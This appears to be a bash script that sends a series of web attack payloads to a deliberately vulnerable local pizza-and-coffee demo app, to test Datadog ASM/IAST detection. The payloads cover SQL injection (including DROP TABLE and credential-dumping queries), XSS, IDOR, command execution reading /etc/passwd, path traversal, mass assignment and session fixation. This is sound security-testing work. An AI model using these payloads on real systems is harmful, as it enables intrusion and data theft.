#!/bin/bash

# Security Scan Simulation Script for Insecure Pizza & Coffee Application
# This script simulates various security scans to test Datadog ASM/IAST detection

BASE_URL="http://localhost:3000"
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}======================================${NC}"
echo -e "${BLUE}  Security Scan Simulation${NC}"
echo -e "${BLUE}  Target: ${BASE_URL}${NC}"
echo -e "${BLUE}======================================${NC}"
echo ""

# Function to print test results
print_test() {
    echo -e "${YELLOW}[TEST]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

# Create a temporary file for cookies
COOKIE_JAR=$(mktemp)
trap "rm -f $COOKIE_JAR" EXIT

sleep_between_tests() {
    sleep 0.5
}

echo -e "${BLUE}==== Phase 1: SQL Injection Attacks ====${NC}"
echo ""

print_test "Testing SQL Injection in login (authentication bypass)"
curl -s -X POST "${BASE_URL}/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR '1'='1&password=anything" \
  -c "$COOKIE_JAR" \
  > /dev/null
print_success "SQL injection payload sent to /auth/login"
sleep_between_tests

print_test "Testing SQL Injection with UNION attack"
curl -s -X POST "${BASE_URL}/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' UNION SELECT 1,2,3,4,5,6,7,8-- -&password=test" \
  > /dev/null
print_success "UNION-based SQL injection sent"
sleep_between_tests

print_test "Testing SQL Injection in registration"
curl -s -X POST "${BASE_URL}/auth/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=hacker'); DROP TABLE users;--&password=test123&email=test@test.com&full_name=Test&phone=1234567890&address=Test" \
  > /dev/null
print_success "SQL injection payload sent to /auth/register"
sleep_between_tests

print_test "Testing SQL Injection in menu category filter"
curl -s "${BASE_URL}/orders/menu?category=coffee' OR '1'='1" \
  -b "$COOKIE_JAR" \
  > /dev/null
print_success "SQL injection sent to menu category filter"
sleep_between_tests

print_test "Testing SQL Injection in password reset"
curl -s -X POST "${BASE_URL}/auth/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1-- -"}' \
  > /dev/null
print_success "SQL injection sent to password reset"
sleep_between_tests

echo ""
echo -e "${BLUE}==== Phase 2: Authentication Attacks ====${NC}"
echo ""

print_test "Testing username enumeration via different error messages"
curl -s -X POST "${BASE_URL}/auth/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"username":"nonexistentuser12345"}' \
  > /dev/null
print_success "Username enumeration test sent"
sleep_between_tests

print_test "Testing weak password during registration"
curl -s -X POST "${BASE_URL}/auth/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=weakpass&password=123&email=weak@test.com&full_name=Weak&phone=1234567890&address=Test" \
  > /dev/null
print_success "Weak password registration attempt sent"
sleep_between_tests

print_test "Testing authentication bypass via SQL injection"
curl -s -X POST "${BASE_URL}/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin'--&password=ignored" \
  -c "${COOKIE_JAR}.admin" \
  > /dev/null
print_success "Authentication bypass attempt sent"
sleep_between_tests

echo ""
echo -e "${BLUE}==== Phase 3: XSS (Cross-Site Scripting) Attacks ====${NC}"
echo ""

print_test "Testing Reflected XSS in registration"
curl -s -X POST "${BASE_URL}/auth/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=<script>alert('XSS')</script>&password=test123&email=xss@test.com&full_name=<img src=x onerror=alert('XSS')>&phone=1234567890&address=Test" \
  > /dev/null
print_success "XSS payload sent to registration form"
sleep_between_tests

print_test "Testing Stored XSS in order notes"
curl -s -X POST "${BASE_URL}/orders/place" \
  -H "Content-Type: application/json" \
  -b "$COOKIE_JAR" \
  -d '{"deliveryAddress":"<script>alert(document.cookie)</script>","deliveryPhone":"1234567890","paymentMethod":"card","notes":"<img src=x onerror=alert(1)>"}' \
  > /dev/null
print_success "Stored XSS payload sent in order notes"
sleep_between_tests

print_test "Testing XSS in admin search"
curl -s "${BASE_URL}/admin/orders?search=<script>alert('XSS')</script>" \
  -b "${COOKIE_JAR}.admin" \
  > /dev/null
print_success "XSS payload sent to admin search"
sleep_between_tests

echo ""
echo -e "${BLUE}==== Phase 4: IDOR (Insecure Direct Object Reference) ====${NC}"
echo ""

print_test "Testing IDOR in order confirmation (accessing other users' orders)"
for order_id in {1..5}; do
    curl -s "${BASE_URL}/orders/confirmation/${order_id}" \
      -b "$COOKIE_JAR" \
      > /dev/null
done
print_success "IDOR tests sent for order confirmation endpoints"
sleep_between_tests

print_test "Testing IDOR via userId parameter"
curl -s "${BASE_URL}/orders/my-orders?userId=1" \
  -b "$COOKIE_JAR" \
  > /dev/null
curl -s "${BASE_URL}/orders/my-orders?userId=2" \
  -b "$COOKIE_JAR" \
  > /dev/null
print_success "IDOR tests sent via userId parameter manipulation"
sleep_between_tests

echo ""
echo -e "${BLUE}==== Phase 5: Command Injection Attacks ====${NC}"
echo ""

print_test "Testing Command Injection in admin system execute"
curl -s -X POST "${BASE_URL}/admin/system/execute" \
  -H "Content-Type: application/json" \
  -b "${COOKIE_JAR}.admin" \
  -d '{"command":"ls -la"}' \
  > /dev/null
print_success "Basic command injection test sent"
sleep_between_tests

print_test "Testing Command Injection with chained commands"
curl -s -X POST "${BASE_URL}/admin/system/execute" \
  -H "Content-Type: application/json" \
  -b "${COOKIE_JAR}.admin" \
  -d '{"command":"cat /etc/passwd"}' \
  > /dev/null
print_success "Sensitive file access attempt sent"
sleep_between_tests

print_test "Testing Command Injection with command substitution"
curl -s -X POST "${BASE_URL}/admin/system/execute" \
  -H "Content-Type: application/json" \
  -b "${COOKIE_JAR}.admin" \
  -d '{"command":"echo $(whoami)"}' \
  > /dev/null
print_success "Command substitution injection sent"
sleep_between_tests

print_test "Testing Command Injection with pipe"
curl -s -X POST "${BASE_URL}/admin/system/execute" \
  -H "Content-Type: application/json" \
  -b "${COOKIE_JAR}.admin" \
  -d '{"command":"ps aux | grep node"}' \
  > /dev/null
print_success "Piped command injection sent"
sleep_between_tests

echo ""
echo -e "${BLUE}==== Phase 6: Arbitrary SQL Execution ====${NC}"
echo ""

print_test "Testing arbitrary SQL query execution (admin)"
curl -s -X POST "${BASE_URL}/admin/database/query" \
  -H "Content-Type: application/json" \
  -b "${COOKIE_JAR}.admin" \
  -d '{"query":"SELECT * FROM users"}' \
  > /dev/null
print_success "Arbitrary SQL query test sent"
sleep_between_tests

print_test "Testing SQL query to extract sensitive data"
curl -s -X POST "${BASE_URL}/admin/database/query" \
  -H "Content-Type: application/json" \
  -b "${COOKIE_JAR}.admin" \
  -d '{"query":"SELECT username, password, email FROM users WHERE is_admin = 1"}' \
  > /dev/null
print_success "Sensitive data extraction query sent"
sleep_between_tests

echo ""
echo -e "${BLUE}==== Phase 7: Path Traversal Attacks ====${NC}"
echo ""

print_test "Testing Path Traversal in export filename"
curl -s "${BASE_URL}/admin/export?type=orders&filename=../../../etc/passwd" \
  -b "${COOKIE_JAR}.admin" \
  > /dev/null
print_success "Path traversal payload sent"
sleep_between_tests

print_test "Testing Path Traversal with URL encoding"
curl -s "${BASE_URL}/admin/export?type=orders&filename=..%2F..%2F..%2Fetc%2Fpasswd" \
  -b "${COOKIE_JAR}.admin" \
  > /dev/null
print_success "URL-encoded path traversal sent"
sleep_between_tests

echo ""
echo -e "${BLUE}==== Phase 8: NoSQL/SQL Injection Variants ====${NC}"
echo ""

print_test "Testing Boolean-based blind SQL injection"
curl -s "${BASE_URL}/orders/menu?category=coffee' AND '1'='1" \
  -b "$COOKIE_JAR" \
  > /dev/null
curl -s "${BASE_URL}/orders/menu?category=coffee' AND '1'='2" \
  -b "$COOKIE_JAR" \
  > /dev/null
print_success "Boolean-based blind SQLi tests sent"
sleep_between_tests

print_test "Testing Time-based blind SQL injection"
curl -s "${BASE_URL}/orders/menu?category=coffee' AND SLEEP(5)-- -" \
  -b "$COOKIE_JAR" \
  > /dev/null
print_success "Time-based blind SQLi test sent"
sleep_between_tests

print_test "Testing Error-based SQL injection"
curl -s "${BASE_URL}/orders/menu?category=coffee' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)-- -" \
  -b "$COOKIE_JAR" \
  > /dev/null
print_success "Error-based SQLi test sent"
sleep_between_tests

echo ""
echo -e "${BLUE}==== Phase 9: Information Disclosure ====${NC}"
echo ""

print_test "Testing for verbose error messages"
curl -s -X POST "${BASE_URL}/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test'&password=test" \
  > /dev/null
print_success "Error message disclosure test sent"
sleep_between_tests

print_test "Testing for database schema disclosure"
curl -s "${BASE_URL}/admin/users" \
  -b "${COOKIE_JAR}.admin" \
  > /dev/null
print_success "Database schema disclosure test sent"
sleep_between_tests

echo ""
echo -e "${BLUE}==== Phase 10: Mass Assignment ====${NC}"
echo ""

print_test "Testing privilege escalation via mass assignment"
curl -s -X POST "${BASE_URL}/auth/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=hacker&password=test123&email=hacker@test.com&full_name=Hacker&phone=1234567890&address=Test&is_admin=1" \
  > /dev/null
print_success "Mass assignment payload sent"
sleep_between_tests

echo ""
echo -e "${BLUE}==== Phase 11: Session Attacks ====${NC}"
echo ""

print_test "Testing session fixation"
curl -s "${BASE_URL}/auth/login" \
  -H "Cookie: connect.sid=s%3Afixed-session-id" \
  > /dev/null
print_success "Session fixation test sent"
sleep_between_tests

print_test "Testing for insecure session cookies"
curl -s -I "${BASE_URL}/auth/login" \
  > /dev/null
print_success "Session cookie security test sent"
sleep_between_tests

echo ""
echo -e "${BLUE}==== Scan Summary ====${NC}"
echo ""
echo -e "${GREEN}✓${NC} SQL Injection tests: 10+ payloads"
echo -e "${GREEN}✓${NC} Authentication bypass tests: 5+ attempts"
echo -e "${GREEN}✓${NC} XSS tests: 5+ payloads"
echo -e "${GREEN}✓${NC} IDOR tests: Multiple endpoints"
echo -e "${GREEN}✓${NC} Command Injection tests: 4+ payloads"
echo -e "${GREEN}✓${NC} Path Traversal tests: 2+ attempts"
echo -e "${GREEN}✓${NC} Information Disclosure tests"
echo -e "${GREEN}✓${NC} Session Security tests"
echo ""
echo -e "${YELLOW}Note:${NC} All attacks are being monitored by Datadog ASM/IAST"
echo -e "${YELLOW}Check your Datadog Security dashboard for detected threats${NC}"
echo ""
echo -e "${BLUE}Scan simulation complete!${NC}"
